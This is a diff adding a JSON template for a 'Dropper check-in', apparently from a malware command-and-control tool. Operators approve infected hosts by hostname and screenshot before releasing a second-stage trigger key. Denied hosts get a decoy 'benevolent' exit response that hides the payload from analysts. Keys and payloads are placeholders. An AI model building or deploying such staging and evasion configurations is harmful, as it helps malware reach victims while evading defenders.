@@ -1,0 +1,20 @@
+{
+  "label": "Dropper check-in",
+  "description": "Encrypted environment package from a dropper; operator reviews hostname/screenshot before anything is released.",
+  "defaults": {
+    "kind": "key",
+    "key_text": "{second-stage trigger key}",
+    "gate_type": "submission",
+    "cipher": "aes256",
+    "cipher_key": "{32-byte hex key}",
+    "cipher_iv": "{16-byte hex iv}",
+    "expected_fields": [
+      "hostname",
+      "username"
+    ],
+    "requires_approval": true,
+    "placeholder": "blank",
+    "on_deny": "benevolent",
+    "benevolent_text": "{clean exit response}"
+  }
+}
